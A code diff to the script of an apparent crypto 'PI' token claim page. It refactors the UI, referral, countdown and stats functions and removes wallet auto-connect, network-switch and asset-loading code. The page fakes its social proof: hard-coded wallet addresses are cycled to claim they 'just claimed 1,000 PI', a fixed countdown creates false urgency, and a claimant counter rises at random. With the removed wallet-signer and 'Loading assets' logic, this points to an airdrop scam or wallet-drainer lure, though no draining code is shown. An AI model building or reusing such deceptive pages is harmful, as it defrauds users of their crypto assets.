-          nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},
-          blockExplorerUrls:[ch.exp||'']
-        }]});
-      }catch(e2){throw new Error('Could not add network');}
-    }else if(e.code===4001){throw new Error('Rejected');}
-    else{throw new Error(e.message||'Switch failed');}
-  }
-  prov=new ethers.BrowserProvider(window.ethereum);
-  sign=await prov.getSigner();
-  currentChainId=cid;
-  updateNavConnected();
-}
+// UI helpers
+function showP(id){['p1','p2','p3','p4','p5'].forEach(function(x){var el=document.getElementById(x);if(el)el.style.display=x===id?'block':'none';});document.getElementById('mc').style.display='block';}
+function stat(msg,t){var e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
+function hideStatus(){document.getElementById('sb').style.display='none';}
+function reset(){document.getElementById('mc').style.display='none';hideStatus();}
+function toast(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(function(){t.style.display='none';},3000);}
+function copyRef(){var inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});}
+function copyRef2(){var inp=document.getElementById('p5ref');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});}
 
-// ============================================
-// REFERRAL
-// ============================================
-function getRefCode(){
-  var r=localStorage.getItem('pi_ref');
-  if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}
-  return r;
-}
-function initRef(){
-  var myCode=getRefCode();
-  var inp=document.getElementById('refLink');
-  if(inp)inp.value=location.origin+location.pathname+'?ref='+myCode;
-  updateRefDisplay();
-}
-function updateRefDisplay(){
-  var refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
-  var earned=refs*200,speed=Math.min(100,10+refs*10);
-  var rc=document.getElementById('refC');if(rc)rc.textContent=refs;
-  var re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
-  var rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
-  var tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';
-}
-function copyRef(){
-  var inp=document.getElementById('refLink');
-  if(!inp||!inp.value)return;
-  navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});
-}
-function copyRef2(){
-  var inp=document.getElementById('p5ref');
-  if(!inp||!inp.value)return;
-  navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});
-}
+// Referral
+function getRefCode(){var r=localStorage.getItem('pi_ref');if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}return r;}
+function initRef(){var myCode=getRefCode();var inp=document.getElementById('refLink');if(inp)inp.value=location.origin+location.pathname+'?ref='+myCode;updateRefDisplay();}
+function updateRefDisplay(){var refs=parseInt(localStorage.getItem('pi_ref_count')||'0');var rc=document.getElementById('refC');if(rc)rc.textContent=refs;var re=document.getElementById('refE');if(re)re.textContent=refs*200+' PI';var rs=document.getElementById('refS');if(rs)rs.textContent=Math.min(100,10+refs*10)+'%';var tf=document.getElementById('tierFill');if(tf)tf.style.width=Math.min(100,10+refs*10)+'%';}
 
-// ============================================
-// COUNTDOWN / SOCIAL PROOF / PARTICLES / STATS
-// ============================================
-function initCountdown(){
-  var t=4*3600+32*60+18;
-  setInterval(function(){
-    t=Math.max(0,t-1);
-    var h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
-    var dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');
-    var dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');
-    var ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');
-  },1000);
-}
+// Countdown
+function initCountdown(){var t=4*3600+32*60+18;setInterval(function(){t=Math.max(0,t-1);var h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;var dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');var dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');var ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');},1000);}
+
+// Social Proof
 var SP=[['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min']];
-function initSP(){
-  var i=0;
-  setInterval(function(){
-    i=(i+1)%SP.length;
-    var e=document.getElementById('spt');
-    if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';
-  },5000);
-}
-function initPart(){
-  var c=document.getElementById('part');
-  for(var i=0;i<20;i++){
-    var s=document.createElement('span');
-    s.style.left=Math.random()*100+'%';
-    s.style.animationDuration=(12+Math.random()*18)+'s';
-    s.style.animationDelay=Math.random()*12+'s';
-    s.style.width=s.style.height=(1+Math.random()*2)+'px';
-    c.appendChild(s);
-  }
-}
-function initStats(){
-  var e=document.getElementById('st-c');
-  if(!e)return;
-  var v=48291;
-  setInterval(function(){v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);
-}
+function initSP(){var i=0;setInterval(function(){i=(i+1)%SP.length;var e=document.getElementById('spt');if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';},5000);}
 
-// ============================================
-// RESET
-// ============================================
-function reset(){
-  document.getElementById('mc').style.display='none';
-  hideStatus();foundChains=[];allTokens=[];selectedChains=new Set();
-}
+// Particles
+function initPart(){var c=document.getElementById('part');for(var i=0;i<20;i++){var s=document.createElement('span');s.style.left=Math.random()*100+'%';s.style.animationDuration=(12+Math.random()*18)+'s';s.style.animationDelay=Math.random()*12+'s';s.style.width=s.style.height=(1+Math.random()*2)+'px';c.appendChild(s);}}
 
-// ============================================
-// AUTO-CONNECT
-// ============================================
-async function autoConnect(){
-  if(window.ethereum){
-    try{
-      var a=await window.ethereum.request({method:'eth_accounts'});
-      if(a&&a.length>0){
-        addr=a[0];
-        prov=new ethers.BrowserProvider(window.ethereum);
-        sign=await prov.getSigner();
-        var network=await prov.getNetwork();
-        currentChainId=Number(network.chainId);
-        updateNavConnected();
-        document.getElementById('mc').style.display='block';
-        showP('p1');
-        document.getElementById('p1l').textContent='Wallet connected! Loading assets...';
-        await loadAssets();
-      }
-    }catch(e){}
-  }
-}
+// Stats
+function initStats(){var e=document.getElementById('st-c');if(!e)return;var v=48291;setInterval(function(){v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);}
 
-// ============================================
-// INIT
-// ============================================
-setupEIP6963(); // Start EIP-6963 discovery immediately
-autoConnect();initPart();initCountdown();initSP();initRef();initStats();
+// Init
+initPart();initCountdown();initSP();initRef();initStats();
 </script>
 </body>
 </html>
